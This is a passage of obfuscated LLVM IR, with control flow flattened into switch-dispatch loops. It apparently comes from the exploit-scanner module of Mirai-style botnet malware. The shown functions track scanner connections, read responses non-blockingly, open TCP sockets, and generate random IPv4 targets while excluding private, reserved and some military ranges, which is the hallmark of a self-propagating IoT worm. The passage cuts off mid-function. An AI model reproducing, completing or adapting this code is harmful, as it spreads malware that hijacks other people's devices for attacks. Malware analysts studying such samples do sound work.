  %621 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %620, i32 0, i32 2
  store i32 0, i32* %621, align 8
  store i32 560828450, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %624 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %623, i32 0, i32 2
  store i32 3, i32* %624, align 8
  store i32 1118806562, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 1519145765, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  store i32 474824350, i32* %switchVar
  br label %loopEnd

; <label>:627:                                    ; preds = %loopEntry
  %628 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %629 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 8
  %631 = call i32 @close(i32 %630)
  %632 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %633 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %632, i32 0, i32 0
  store i32 -1, i32* %633, align 8
  %634 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %635 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %634, i32 0, i32 2
  store i32 0, i32* %635, align 8
  store i32 560828450, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  store i32 1765219740, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %639 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %640 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %639, i32 0, i32 0
  %641 = load i32, i32* %640, align 8
  %642 = sdiv i32 %641, 64
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds [16 x i64], [16 x i64]* %638, i64 0, i64 %643
  %645 = load i64, i64* %644, align 8
  %646 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %647 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %646, i32 0, i32 0
  %648 = load i32, i32* %647, align 8
  %649 = srem i32 %648, 64
  %650 = zext i32 %649 to i64
  %651 = shl i64 1, %650
  %652 = and i64 %645, %651
  %653 = icmp ne i64 %652, 0
  %654 = select i1 %653, i32 1630729706, i32 -1924758780
  store i32 %654, i32* %switchVar
  br label %loopEnd

; <label>:655:                                    ; preds = %loopEntry
  store i32 -475883324, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  %657 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %658 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %657, i32 0, i32 2
  %659 = load i32, i32* %658, align 8
  %660 = icmp eq i32 %659, 0
  %661 = select i1 %660, i32 1630207088, i32 1212297442
  store i32 %661, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  store i32 -2009609103, i32* %switchVar
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  %664 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %665 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %664, i32 0, i32 5
  %666 = load i32, i32* %665, align 4
  %667 = icmp eq i32 %666, 256
  %668 = select i1 %667, i32 1518810170, i32 -1484944710
  store i32 %668, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %671 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %670, i32 0, i32 6
  %672 = getelementptr inbounds [256 x i8], [256 x i8]* %671, i32 0, i32 0
  %673 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %674 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %673, i32 0, i32 6
  %675 = getelementptr inbounds [256 x i8], [256 x i8]* %674, i32 0, i32 0
  %676 = getelementptr inbounds i8, i8* %675, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %672, i8* %676, i64 192, i32 1, i1 false)
  %677 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %678 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %677, i32 0, i32 5
  %679 = load i32, i32* %678, align 4
  %680 = sub nsw i32 %679, 64
  store i32 %680, i32* %678, align 4
  store i32 -1484944710, i32* %switchVar
  br label %loopEnd

; <label>:681:                                    ; preds = %loopEntry
  %682 = call i32* @__errno_location() #9
  store i32 0, i32* %682, align 4
  %683 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %684 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %683, i32 0, i32 0
  %685 = load i32, i32* %684, align 8
  %686 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %687 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %686, i32 0, i32 6
  %688 = getelementptr inbounds [256 x i8], [256 x i8]* %687, i32 0, i32 0
  %689 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %690 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %689, i32 0, i32 5
  %691 = load i32, i32* %690, align 4
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds i8, i8* %688, i64 %692
  %694 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %695 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %694, i32 0, i32 5
  %696 = load i32, i32* %695, align 4
  %697 = sub nsw i32 256, %696
  %698 = call i32 @exploit_recv_strip_null(i32 %685, i8* %693, i32 %697, i32 16384)
  store i32 %698, i32* %32, align 4
  %699 = load i32, i32* %32, align 4
  %700 = icmp eq i32 %699, 0
  %701 = select i1 %700, i32 143701741, i32 -195442174
  store i32 %701, i32* %switchVar
  br label %loopEnd

; <label>:702:                                    ; preds = %loopEntry
  %703 = call i32* @__errno_location() #9
  store i32 104, i32* %703, align 4
  store i32 -1, i32* %32, align 4
  store i32 -195442174, i32* %switchVar
  br label %loopEnd

; <label>:704:                                    ; preds = %loopEntry
  %705 = load i32, i32* %32, align 4
  %706 = icmp eq i32 %705, -1
  %707 = select i1 %706, i32 -1400367090, i32 1185539156
  store i32 %707, i32* %switchVar
  br label %loopEnd

; <label>:708:                                    ; preds = %loopEntry
  %709 = call i32* @__errno_location() #9
  %710 = load i32, i32* %709, align 4
  %711 = icmp ne i32 %710, 11
  %712 = select i1 %711, i32 -28477629, i32 -20722418
  store i32 %712, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = call i32* @__errno_location() #9
  %715 = load i32, i32* %714, align 4
  %716 = icmp ne i32 %715, 11
  %717 = select i1 %716, i32 -230335934, i32 -20722418
  store i32 %717, i32* %switchVar
  br label %loopEnd

; <label>:718:                                    ; preds = %loopEntry
  %719 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %720 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %719, i32 0, i32 2
  %721 = load i32, i32* %720, align 8
  %722 = icmp eq i32 %721, 3
  %723 = select i1 %722, i32 -677603252, i32 1087619995
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  %725 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %726 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %725, i32 0, i32 0
  %727 = load i32, i32* %726, align 8
  %728 = call i32 @close(i32 %727)
  %729 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* %729)
  store i32 -475883324, i32* %switchVar
  br label %loopEnd

; <label>:730:                                    ; preds = %loopEntry
  %731 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %732 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %731, i32 0, i32 0
  %733 = load i32, i32* %732, align 8
  %734 = call i32 @close(i32 %733)
  %735 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %736 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %735, i32 0, i32 0
  store i32 -1, i32* %736, align 8
  %737 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %738 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %737, i32 0, i32 2
  store i32 0, i32* %738, align 8
  %739 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %740 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %739, i32 0, i32 6
  %741 = getelementptr inbounds [256 x i8], [256 x i8]* %740, i32 0, i32 0
  call void @util_zero(i8* %741, i32 256)
  store i32 -20722418, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  store i32 -2009609103, i32* %switchVar
  br label %loopEnd

; <label>:743:                                    ; preds = %loopEntry
  %744 = load i32, i32* %32, align 4
  %745 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %746 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %745, i32 0, i32 5
  %747 = load i32, i32* %746, align 4
  %748 = add nsw i32 %747, %744
  store i32 %748, i32* %746, align 4
  %749 = load i32, i32* @exploit_fake_time, align 4
  %750 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %751 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %750, i32 0, i32 1
  store i32 %749, i32* %751, align 4
  %752 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %753 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %752, i32 0, i32 6
  %754 = getelementptr inbounds [256 x i8], [256 x i8]* %753, i32 0, i32 0
  %755 = call i32 @util_strlen(i8* %754)
  store i32 %755, i32* %33, align 4
  %756 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %757 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %756, i32 0, i32 6
  %758 = load i32, i32* %33, align 4
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds [256 x i8], [256 x i8]* %757, i64 0, i64 %759
  store i8 0, i8* %760, align 1
  store i32 -475883324, i32* %switchVar
  br label %loopEnd

; <label>:761:                                    ; preds = %loopEntry
  store i32 -1924758780, i32* %switchVar
  br label %loopEnd

; <label>:762:                                    ; preds = %loopEntry
  store i32 560828450, i32* %switchVar
  br label %loopEnd

; <label>:763:                                    ; preds = %loopEntry
  %764 = load i32, i32* %1, align 4
  %765 = add nsw i32 %764, 1
  store i32 %765, i32* %1, align 4
  store i32 1378769907, i32* %switchVar
  br label %loopEnd

; <label>:766:                                    ; preds = %loopEntry
  store i32 -972643207, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %766, %763, %762, %761, %743, %742, %730, %724, %718, %713, %708, %704, %702, %681, %669, %663, %662, %656, %655, %637, %636, %627, %626, %625, %622, %613, %607, %582, %576, %572, %563, %545, %544, %534, %530, %525, %523, %521, %514, %511, %510, %509, %508, %504, %482, %476, %475, %471, %449, %443, %437, %431, %419, %410, %400, %396, %395, %386, %385, %376, %375, %363, %362, %358, %355, %354, %348, %339, %335, %333, %332, %320, %319, %311, %310, %302, %301, %293, %292, %284, %283, %274, %273, %264, %263, %256, %255, %248, %247, %242, %241, %236, %231, %214, %213, %212, %209, %154, %150, %148, %143, %97, %91, %87, %86, %72, %67, %64, %53, %49, %43, %38, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  store i8 0, i8* %2, align 1
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  %switchVar = alloca i32
  store i32 593219790, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 593219790, label %6
    i32 99276636, label %25
    i32 -1506317322, label %30
    i32 -1454018139, label %35
    i32 -682239394, label %40
    i32 -207341826, label %45
    i32 1502956991, label %50
    i32 -756516563, label %55
    i32 -1969859794, label %60
    i32 -1970243158, label %65
    i32 1065970022, label %70
    i32 230457738, label %75
    i32 -1148314233, label %80
    i32 -1833219500, label %85
    i32 -1238206205, label %90
    i32 -974493151, label %95
    i32 2143696636, label %100
    i32 730936566, label %105
    i32 1938125036, label %110
    i32 1327994728, label %115
    i32 -1613320146, label %120
    i32 -1230985832, label %125
    i32 764860733, label %130
    i32 343795728, label %135
    i32 -356914937, label %140
    i32 133938538, label %145
    i32 -1898245817, label %150
    i32 -200577036, label %155
    i32 2103889579, label %160
    i32 1373519017, label %165
    i32 1327961388, label %170
    i32 741638990, label %175
    i32 -253236790, label %180
    i32 -847514340, label %185
    i32 -1275196934, label %190
    i32 511800596, label %194
    i32 -566164257, label %195
    i32 -1161145011, label %197
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = call i64 @time(i64* null) #6
  %9 = trunc i64 %8 to i32
  call void @srand(i32 %9) #6
  %10 = load i32, i32* %1, align 4
  %11 = and i32 %10, 255
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* %2, align 1
  %13 = load i32, i32* %1, align 4
  %14 = lshr i32 %13, 8
  %15 = and i32 %14, 255
  %16 = trunc i32 %15 to i8
  store i8 %16, i8* %3, align 1
  %17 = load i32, i32* %1, align 4
  %18 = lshr i32 %17, 16
  %19 = and i32 %18, 255
  %20 = trunc i32 %19 to i8
  store i8 %20, i8* %4, align 1
  %21 = load i32, i32* %1, align 4
  %22 = lshr i32 %21, 24
  %23 = and i32 %22, 255
  %24 = trunc i32 %23 to i8
  store i8 %24, i8* %5, align 1
  store i32 99276636, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8, i8* %2, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 127
  %29 = select i1 %28, i32 -566164257, i32 -1506317322
  store i32 %29, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8, i8* %2, align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  %34 = select i1 %33, i32 -566164257, i32 -1454018139
  store i32 %34, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8, i8* %2, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %37, 3
  %39 = select i1 %38, i32 -566164257, i32 -682239394
  store i32 %39, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8, i8* %2, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %42, 15
  %44 = select i1 %43, i32 -566164257, i32 -207341826
  store i32 %44, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8, i8* %2, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 16
  %49 = select i1 %48, i32 -566164257, i32 1502956991
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8, i8* %2, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 56
  %54 = select i1 %53, i32 -566164257, i32 -756516563
  store i32 %54, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i8, i8* %2, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 10
  %59 = select i1 %58, i32 -566164257, i32 -1969859794
  store i32 %59, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i8, i8* %2, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp eq i32 %62, 192
  %64 = select i1 %63, i32 -1970243158, i32 1065970022
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8, i8* %3, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 168
  %69 = select i1 %68, i32 -566164257, i32 1065970022
  store i32 %69, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8, i8* %2, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 172
  %74 = select i1 %73, i32 230457738, i32 -1833219500
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i8, i8* %3, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp sge i32 %77, 16
  %79 = select i1 %78, i32 -1148314233, i32 -1833219500
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i8, i8* %3, align 1
  %82 = zext i8 %81 to i32
  %83 = icmp slt i32 %82, 32
  %84 = select i1 %83, i32 -566164257, i32 -1833219500
  store i32 %84, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i8, i8* %2, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 100
  %89 = select i1 %88, i32 -1238206205, i32 2143696636
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i8, i8* %3, align 1
  %92 = zext i8 %91 to i32
  %93 = icmp sge i32 %92, 64
  %94 = select i1 %93, i32 -974493151, i32 2143696636
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i8, i8* %3, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp slt i32 %97, 127
  %99 = select i1 %98, i32 -566164257, i32 2143696636
  store i32 %99, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i8, i8* %2, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 169
  %104 = select i1 %103, i32 730936566, i32 1938125036
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %3, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp sgt i32 %107, 254
  %109 = select i1 %108, i32 -566164257, i32 1938125036
  store i32 %109, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i8, i8* %2, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 198
  %114 = select i1 %113, i32 1327994728, i32 -1230985832
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8, i8* %3, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp sge i32 %117, 18
  %119 = select i1 %118, i32 -1613320146, i32 -1230985832
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i8, i8* %3, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp slt i32 %122, 20
  %124 = select i1 %123, i32 -566164257, i32 -1230985832
  store i32 %124, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i8, i8* %2, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp sge i32 %127, 224
  %129 = select i1 %128, i32 -566164257, i32 764860733
  store i32 %129, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8, i8* %2, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 6
  %134 = select i1 %133, i32 511800596, i32 343795728
  store i32 %134, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i8, i8* %2, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 7
  %139 = select i1 %138, i32 511800596, i32 -356914937
  store i32 %139, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8, i8* %2, align 1
  %142 = zext i8 %141 to i32
  %143 = icmp eq i32 %142, 11
  %144 = select i1 %143, i32 511800596, i32 133938538
  store i32 %144, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i8, i8* %2, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 21
  %149 = select i1 %148, i32 511800596, i32 -1898245817
  store i32 %149, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i8, i8* %2, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 22
  %154 = select i1 %153, i32 511800596, i32 -200577036
  store i32 %154, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i8, i8* %2, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 26
  %159 = select i1 %158, i32 511800596, i32 2103889579
  store i32 %159, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i8, i8* %2, align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 28
  %164 = select i1 %163, i32 511800596, i32 1373519017
  store i32 %164, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i8, i8* %2, align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 29
  %169 = select i1 %168, i32 511800596, i32 1327961388
  store i32 %169, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i8, i8* %2, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 30
  %174 = select i1 %173, i32 511800596, i32 741638990
  store i32 %174, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8, i8* %2, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 33
  %179 = select i1 %178, i32 511800596, i32 -253236790
  store i32 %179, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = load i8, i8* %2, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 55
  %184 = select i1 %183, i32 511800596, i32 -847514340
  store i32 %184, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i8, i8* %2, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp eq i32 %187, 214
  %189 = select i1 %188, i32 511800596, i32 -1275196934
  store i32 %189, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* %2, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 215
  store i32 511800596, i32* %switchVar
  store i1 %193, i1* %.reg2mem
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -566164257, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %196 = select i1 %.reload3, i32 593219790, i32 -1161145011
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8, i8* %2, align 1
  %199 = zext i8 %198 to i32
  %200 = shl i32 %199, 24
  %201 = load i8, i8* %3, align 1
  %202 = zext i8 %201 to i32
  %203 = shl i32 %202, 16
  %204 = or i32 %200, %203
  %205 = load i8, i8* %4, align 1
  %206 = zext i8 %205 to i32
  %207 = shl i32 %206, 8
  %208 = or i32 %204, %207
  %209 = load i8, i8* %5, align 1
  %210 = zext i8 %209 to i32
  %211 = shl i32 %210, 0
  %212 = or i32 %208, %211
  %213 = call i32 @htonl(i32 %212) #9
  ret i32 %213

loopEnd:                                          ; preds = %195, %194, %190, %185, %180, %175, %170, %165, %160, %155, %150, %145, %140, %135, %130, %125, %120, %115, %110, %105, %100, %95, %90, %85, %80, %75, %70, %65, %60, %55, %50, %45, %40, %35, %30, %25, %6, %switchDefault
  br label %loopEntry
}

declare zeroext i16 @checksum_generic(i16*, i32) #5

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #5

; Function Attrs: noinline nounwind uwtable
define internal void @exploit_setup_connection(%struct.exploit_scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca %struct.exploit_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1470724690, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1470724690, label %first
    i32 342258338, label %11
    i32 -1089390497, label %16
    i32 -288715435, label %22
    i32 -1418716638, label %23
    i32 1023133583, label %56
    i32 714063430, label %62
    i32 -71226067, label %63
    i32 -420476553, label %66
    i32 346194703, label %75
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp ne i32 %.reload, -1
  %10 = select i1 %9, i32 342258338, i32 -1089390497
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %13 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 8
  %15 = call i32 @close(i32 %14)
  store i32 -1089390497, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %18 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %19 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %18, i32 0, i32 0
  store i32 %17, i32* %19, align 8
  %20 = icmp eq i32 %17, -1
  %21 = select i1 %20, i32 -288715435, i32 -1418716638
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 346194703, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %24, i32 0, i32 5
  store i32 0, i32* %25, align 4
  %26 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %27 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %26, i32 0, i32 6
